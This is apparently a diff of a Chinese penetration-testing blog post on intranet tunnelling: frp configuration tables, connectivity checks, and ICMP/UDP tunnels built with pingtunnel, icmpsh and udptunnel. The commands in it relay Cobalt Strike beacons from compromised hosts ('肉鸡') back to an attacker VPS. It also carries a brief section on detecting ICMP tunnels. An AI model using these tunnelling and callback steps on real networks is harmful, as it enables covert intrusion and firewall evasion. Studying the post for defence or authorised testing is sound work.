+<td>结合 http_user 使用</td>
+</tr>
+<tr>
+<td>host_header_rewrite</td>
+<td>string</td>
+<td>替换 Host header</td>
+<td>否</td>
+<td></td>
+<td></td>
+<td>替换发送到本地服务 HTTP 请求中的 Host 字段</td>
+</tr>
+<tr>
+<td>headers</td>
+<td>map</td>
+<td>替换 header</td>
+<td>否</td>
+<td></td>
+<td></td>
+<td>map 中的 key 是要替换的 header 的 key，value 是替换后的内容</td>
+</tr>
+</tbody></table>
+<h4 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h4><p><code>custom_domains</code> 和 <code>subdomain</code> 必须要配置其中一个，两者可以同时生效。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>类型</th>
+<th>说明</th>
+<th>是否必须</th>
+<th>默认值</th>
+<th>可选值</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>custom_domains</td>
+<td>[]string</td>
+<td>服务器绑定自定义域名</td>
+<td>是(和 subdomain 两者必须配置一个)</td>
+<td></td>
+<td></td>
+<td>用户通过 vhost_http_port 访问的 HTTP 请求如果 Host 在 custom_domains 配置的域名中，则会被路由到此代理配置的本地服务</td>
+</tr>
+<tr>
+<td>subdomain</td>
+<td>string</td>
+<td>自定义子域名</td>
+<td>是(和 custom_domains 两者必须配置一个)</td>
+<td></td>
+<td></td>
+<td>和 custom_domains 作用相同，但是只需要指定子域名前缀，会结合服务端的 subdomain_host 生成最终绑定的域名</td>
+</tr>
+</tbody></table>
+<h4 id="STCP"><a href="#STCP" class="headerlink" title="STCP"></a>STCP</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>类型</th>
+<th>说明</th>
+<th>是否必须</th>
+<th>默认值</th>
+<th>可选值</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>role</td>
+<td>string</td>
+<td>角色</td>
+<td>是</td>
+<td>server</td>
+<td>server,visitor</td>
+<td>server 表示服务端，visitor 表示访问端</td>
+</tr>
+<tr>
+<td>sk</td>
+<td>string</td>
+<td>密钥</td>
+<td>是</td>
+<td></td>
+<td></td>
+<td>服务端和访问端的密钥需要一致，访问端才能访问到服务端</td>
+</tr>
+</tbody></table>
+<h4 id="SUDP"><a href="#SUDP" class="headerlink" title="SUDP"></a>SUDP</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>类型</th>
+<th>说明</th>
+<th>是否必须</th>
+<th>默认值</th>
+<th>可选值</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>role</td>
+<td>string</td>
+<td>角色</td>
+<td>是</td>
+<td>server</td>
+<td>server,visitor</td>
+<td>server 表示服务端，visitor 表示访问端</td>
+</tr>
+<tr>
+<td>sk</td>
+<td>string</td>
+<td>密钥</td>
+<td>是</td>
+<td></td>
+<td></td>
+<td>服务端和访问端的密钥需要一致，访问端才能访问到服务端</td>
+</tr>
+</tbody></table>
+<h4 id="XTCP"><a href="#XTCP" class="headerlink" title="XTCP"></a>XTCP</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>类型</th>
+<th>说明</th>
+<th>是否必须</th>
+<th>默认值</th>
+<th>可选值</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>role</td>
+<td>string</td>
+<td>角色</td>
+<td>是</td>
+<td>server</td>
+<td>server,visitor</td>
+<td>server 表示服务端，visitor 表示访问端</td>
+</tr>
+<tr>
+<td>sk</td>
+<td>string</td>
+<td>密钥</td>
+<td>是</td>
+<td></td>
+<td></td>
+<td>服务端和访问端的密钥需要一致，访问端才能访问到服务端</td>
+</tr>
+</tbody></table>
+<h1 id="隧道"><a href="#隧道" class="headerlink" title="隧道"></a>隧道</h1><ul>
+<li>隧道就是一种绕过端口屏蔽的通信方式，防火墙两端的数据包通过防火墙所允许的数据包类型或者端口进行封装，然后穿过防火墙，与对方进行通信。当被封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到对应的服务器上。</li>
+</ul>
+<p>常见的隧道列举如下：</p>
+<ul>
+<li>网络层:IPv6隧道、ICMP隧道、GRE隧道</li>
+<li>传输层：TCP隧道、UDP隧道、常规端口转发</li>
+<li>应用层：SSH隧道、HTTP隧道、HTTPS隧道、DNS隧道</li>
+</ul>
+<h2 id="判断内网连通性"><a href="#判断内网连通性" class="headerlink" title="判断内网连通性"></a>判断内网连通性</h2><ol>
+<li><p>ICMP</p>
+<p>通过ping命令来判断</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping &lt;域名&#x2F;IP&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>TCP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc &lt;IP地址 端口号&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>HTTP协议</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl www.baidu.com</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>DNS协议</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;Windows</span><br><span class="line">nslookup www.baidu.com &lt;vps-ip&gt;</span><br><span class="line">&#x2F;&#x2F;Linux</span><br><span class="line">dig www.baidu.com</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>也有可能通过proxy连接外网</p>
+<ul>
+<li>查看网络连接(ping -n 1 -a ip)</li>
+<li>查看内网中是否有”proxy”主机名的机器</li>
+<li>查看IE代理</li>
+<li>查看pac文件路径</li>
+</ul>
+<p>通过以下命令进行确认</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl www.baidu.com &#x2F;&#x2F;不通</span><br><span class="line">curl -x proxy-ip:port www.baidu.com &#x2F;&#x2F;通</span><br></pre></td></tr></table></figure>
+
+<h3 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h3><p>ICMP隧道特点：不需要开启端口、防火墙一般不会阻拦</p>
+<h4 id="pingtunnel"><a href="#pingtunnel" class="headerlink" title="pingtunnel"></a>pingtunnel</h4><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>
+<p>特点：使用icmp协议传输数据，防火墙一般不拦截，需要root/administrator权限</p>
+<p>服务器端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wet https:&#x2F;&#x2F;github.com&#x2F;esrrhs&#x2F;pingtunnel&#x2F;releases&#x2F;download&#x2F;2.6&#x2F;pingtunnel_linux_amd64.zip</span><br><span class="line">unzip pingtunnel_linux_amd64.zip</span><br><span class="line">.&#x2F;pingtunnel -type server</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220126135122036.png" alt="image-20220126135122036"></p>
+<p>客户端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wet https:&#x2F;&#x2F;github.com&#x2F;esrrhs&#x2F;pingtunnel&#x2F;releases&#x2F;download&#x2F;2.6&#x2F;pingtunnel_linux_amd64.zip</span><br><span class="line">unzip pingtunnel_linux_amd64.zip</span><br><span class="line">.&#x2F;pingtunnel -client</span><br><span class="line">&#x2F;&#x2F;转发sock5</span><br><span class="line">pingtunnel.exe -type client -l :4455 -s www.yourserver.com -sock5 1</span><br><span class="line">&#x2F;&#x2F;转发tcp</span><br><span class="line">pingtunnel.exe -type client -l :4455 -s www.yourserver.com -t www.yourserver.com:4455 -tcp 1</span><br><span class="line">&#x2F;&#x2F;转发udp</span><br><span class="line">pingtunnel.exe -type client -l :4455 -s www.yourserver.com -t www.yourserver.com:4455</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-l 监听的本地地址</li>
+<li>-s 开启server模式的vps地址(IP和域名都可)</li>
+<li>-t 转发的目的地址</li>
+</ul>
+<p><strong>CS上线</strong></p>
+<p>cs设置监听</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220126154627344.png" alt="image-20220126154627344"></p>
+<p>服务器端开启代理：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;pingtunnel -type server</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220126135122036.png" alt="image-20220126135122036"></p>
+<p>客户端开启代理：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -type client -l :6666 -s vps -t vps:80 -tcp 1</span><br><span class="line">pingtunnel.exe -type client -l :6666 -s vps -sock5 1</span><br></pre></td></tr></table></figure>
+
+<p>监听本地6666转发到80端口</p>
+<p>生成ICMP的beacon之后传到肉鸡运行即可</p>
+<h4 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h4><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/inquisb/icmpsh.git">https://github.com/inquisb/icmpsh.git</a></p>
+<p><strong>服务器vps:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;inquisb&#x2F;icmpsh.git</span><br></pre></td></tr></table></figure>
+
+<p><strong>安装依赖</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-install python-impacket</span><br></pre></td></tr></table></figure>
+
+<p>安装python的impacket类库以便对TCP、UDP、ICMP、Kerberos、WMI等协议进行访问</p>
+<p><strong>关闭系统ping的应答</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>注意:记得恢复，否则会出错，将1改为0即可</li>
+</ul>
+<p><strong>获取命令</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;run.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220126215147938.png" alt="image-20220126215147938"></p>
+<p><strong>肉鸡：</strong></p>
+<p>运行上面给出的命令即可，由于没有公网的win机，不做测试</p>
+<h4 id="防御ICMP隧道"><a href="#防御ICMP隧道" class="headerlink" title="防御ICMP隧道"></a>防御ICMP隧道</h4><p>大多数防火墙规则中，由内而外的ping命令是被允许的，由外而内的icmp包被拦截。但是ICMP隧道的特点也很明显：</p>
+<ul>
+<li>同一来源的ICMP数据包大</li>
+<li>注意Payload大于64bit的ICMP数据包</li>
+<li>寻找响应数据包中payload与请求数据包中payload不一致的ICMP数据包</li>
+<li>检查ICMP数据包的协议标签，如icmptunnel的ICMP Payload前面有”TUNL”标记</li>
+</ul>
+<h2 id="udptunnel"><a href="#udptunnel" class="headerlink" title="udptunnel"></a>udptunnel</h2><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/jingyu/udptunnel">https://github.com/jingyu/udptunnel</a></p>
+<p>udptunnel将tcp流量封装在udp中<br>• 需要自己编译（Linux上gcc或者Windows上vs编译）</p>
+<p>服务器端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;udptunnel -s 0.0.0.0:7788</span><br></pre></td></tr></table></figure>
+
+<p>客户端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">udptunnel.exe -c 0.0.0.0:6666 -t vps:7788</span><br><span class="line">-r vps:80</span><br></pre></td></tr></table></figure>
+
+<p>监听本地6666，转发到vps的80端口</p>
+<p>在vps上开启cs监听</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220126152701899.png" alt="image-20220126152701899"></p>
+<p>生成ICMP的木马(实际是UDP)，放到肉鸡运行，即可收到回连</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220126152844676.png" alt="image-20220126152844676"></p>
 <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
 <li><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/140684.html">https://www.secpulse.com/archives/140684.html</a></li>
 <li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6349#toc-26">https://xz.aliyun.com/t/6349#toc-26</a></li>
@@ -571,7 +1837,7 @@ height:50vh;
             <p>Author：<a href="https://hackerqwq.github.io">HacKerQWQ</a>
             <p>原文链接：<a href="https://hackerqwq.github.io/2021/07/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E3%80%81%E6%98%A0%E5%B0%84%E3%80%81%E4%BB%A3%E7%90%86/">https://hackerqwq.github.io/2021/07/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E3%80%81%E6%98%A0%E5%B0%84%E3%80%81%E4%BB%A3%E7%90%86/</a>
             <p>发表日期：<a href="https://hackerqwq.github.io/2021/07/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E3%80%81%E6%98%A0%E5%B0%84%E3%80%81%E4%BB%A3%E7%90%86/">July 11th 2021, 3:47:45 pm</a>
-            <p>更新日期：<a href="https://hackerqwq.github.io/2021/07/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E3%80%81%E6%98%A0%E5%B0%84%E3%80%81%E4%BB%A3%E7%90%86/">August 1st 2021, 1:01:11 am</a>
+            <p>更新日期：<a href="https://hackerqwq.github.io/2021/07/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E3%80%81%E6%98%A0%E5%B0%84%E3%80%81%E4%BB%A3%E7%90%86/">January 26th 2022, 9:59:44 pm</a>
             <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -716,7 +1982,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E3%80%81%E6%98%A0%E5%B0%84%E3%80%81%E4%BB%A3%E7%90%86%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text">端口转发、映射、代理概念</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E3%80%81%E6%98%A0%E5%B0%84"><span class="toc-number">2.</span> <span class="toc-text">端口转发、映射</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NC%E5%B7%A5%E5%85%B7"><span class="toc-number">2.1.</span> <span class="toc-text">NC工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NC%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.1.1.</span> <span class="toc-text">NC反向连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NC%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.1.2.</span> <span class="toc-text">NC正向连接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LCX%E5%B7%A5%E5%85%B7"><span class="toc-number">2.2.</span> <span class="toc-text">LCX工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LCX%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84"><span class="toc-number">2.2.1.</span> <span class="toc-text">LCX端口映射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LCX%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">2.2.2.</span> <span class="toc-text">LCX端口转发</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Metasploit%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E3%80%81%E8%BD%AC%E5%8F%91"><span class="toc-number">3.</span> <span class="toc-text">Metasploit进行端口映射、转发</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%90%86"><span class="toc-number">4.</span> <span class="toc-text">代理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E7%AE%80%E4%BB%8B"><span class="toc-number">4.1.</span> <span class="toc-text">代理简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#socks%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.2.</span> <span class="toc-text">socks协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reGeorg-Proxychains"><span class="toc-number">4.3.</span> <span class="toc-text">reGeorg+Proxychains</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">4.3.1.</span> <span class="toc-text">利用方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EarthWorm"><span class="toc-number">4.4.</span> <span class="toc-text">EarthWorm</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83"><span class="toc-number">4.4.1.</span> <span class="toc-text">普通网络环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8E%E4%BA%8C%E9%87%8D%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%EF%BC%9A"><span class="toc-number">4.4.2.</span> <span class="toc-text">对于二重网络环境：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">4.5.</span> <span class="toc-text">SSH端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91"><span class="toc-number">4.5.1.</span> <span class="toc-text">SSH本地转发</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">4.5.1.1.</span> <span class="toc-text">利用方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%8F%91"><span class="toc-number">4.5.2.</span> <span class="toc-text">SSH远程转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh%E5%8A%A8%E6%80%81%E8%BD%AC%E5%8F%91"><span class="toc-number">4.5.3.</span> <span class="toc-text">ssh动态转发</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">4.5.3.1.</span> <span class="toc-text">利用过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E8%AE%BA"><span class="toc-number">4.5.4.</span> <span class="toc-text">结论</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E3%80%81%E6%98%A0%E5%B0%84%E3%80%81%E4%BB%A3%E7%90%86%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text">端口转发、映射、代理概念</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E3%80%81%E6%98%A0%E5%B0%84"><span class="toc-number">2.</span> <span class="toc-text">端口转发、映射</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NC%E5%B7%A5%E5%85%B7"><span class="toc-number">2.1.</span> <span class="toc-text">NC工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NC%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.1.1.</span> <span class="toc-text">NC反向连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NC%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.1.2.</span> <span class="toc-text">NC正向连接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LCX%E5%B7%A5%E5%85%B7"><span class="toc-number">2.2.</span> <span class="toc-text">LCX工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LCX%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84"><span class="toc-number">2.2.1.</span> <span class="toc-text">LCX端口映射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LCX%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">2.2.2.</span> <span class="toc-text">LCX端口转发</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Metasploit%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E3%80%81%E8%BD%AC%E5%8F%91"><span class="toc-number">3.</span> <span class="toc-text">Metasploit进行端口映射、转发</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%90%86"><span class="toc-number">4.</span> <span class="toc-text">代理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E7%AE%80%E4%BB%8B"><span class="toc-number">4.1.</span> <span class="toc-text">代理简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#socks%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.2.</span> <span class="toc-text">socks协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reGeorg-Proxychains"><span class="toc-number">4.3.</span> <span class="toc-text">reGeorg+Proxychains</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">4.3.1.</span> <span class="toc-text">利用方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EarthWorm"><span class="toc-number">4.4.</span> <span class="toc-text">EarthWorm</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83"><span class="toc-number">4.4.1.</span> <span class="toc-text">普通网络环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8E%E4%BA%8C%E9%87%8D%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%EF%BC%9A"><span class="toc-number">4.4.2.</span> <span class="toc-text">对于二重网络环境：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">4.5.</span> <span class="toc-text">SSH端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91"><span class="toc-number">4.5.1.</span> <span class="toc-text">SSH本地转发</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">4.5.1.1.</span> <span class="toc-text">利用方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%8F%91"><span class="toc-number">4.5.2.</span> <span class="toc-text">SSH远程转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh%E5%8A%A8%E6%80%81%E8%BD%AC%E5%8F%91"><span class="toc-number">4.5.3.</span> <span class="toc-text">ssh动态转发</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">4.5.3.1.</span> <span class="toc-text">利用过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E8%AE%BA"><span class="toc-number">4.5.4.</span> <span class="toc-text">结论</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#frp"><span class="toc-number">4.6.</span> <span class="toc-text">frp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE"><span class="toc-number">4.6.1.</span> <span class="toc-text">客户端配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE"><span class="toc-number">4.6.1.1.</span> <span class="toc-text">基础配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E9%AA%8C%E8%AF%81"><span class="toc-number">4.6.1.2.</span> <span class="toc-text">权限验证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UI"><span class="toc-number">4.6.1.3.</span> <span class="toc-text">UI</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E9%85%8D%E7%BD%AE"><span class="toc-number">4.6.2.</span> <span class="toc-text">服务器端配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE-1"><span class="toc-number">4.6.2.1.</span> <span class="toc-text">基础配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E9%AA%8C%E8%AF%81-1"><span class="toc-number">4.6.2.2.</span> <span class="toc-text">权限验证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E9%85%8D%E7%BD%AE"><span class="toc-number">4.6.2.3.</span> <span class="toc-text">管理配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dashboard-%E7%9B%91%E6%8E%A7"><span class="toc-number">4.6.2.4.</span> <span class="toc-text">Dashboard, 监控</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTP-amp-HTTPS"><span class="toc-number">4.6.2.5.</span> <span class="toc-text">HTTP &amp; HTTPS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TCPMUX"><span class="toc-number">4.6.2.6.</span> <span class="toc-text">TCPMUX</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE"><span class="toc-number">4.6.3.</span> <span class="toc-text">代理配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E9%85%8D%E7%BD%AE"><span class="toc-number">4.6.3.1.</span> <span class="toc-text">通用配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE-2"><span class="toc-number">4.6.3.2.</span> <span class="toc-text">基础配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE"><span class="toc-number">4.6.3.3.</span> <span class="toc-text">本地服务配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%92%8C%E5%81%A5%E5%BA%B7%E6%A3%80%E6%9F%A5"><span class="toc-number">4.6.3.4.</span> <span class="toc-text">负载均衡和健康检查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TCP"><span class="toc-number">4.6.3.5.</span> <span class="toc-text">TCP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UDP"><span 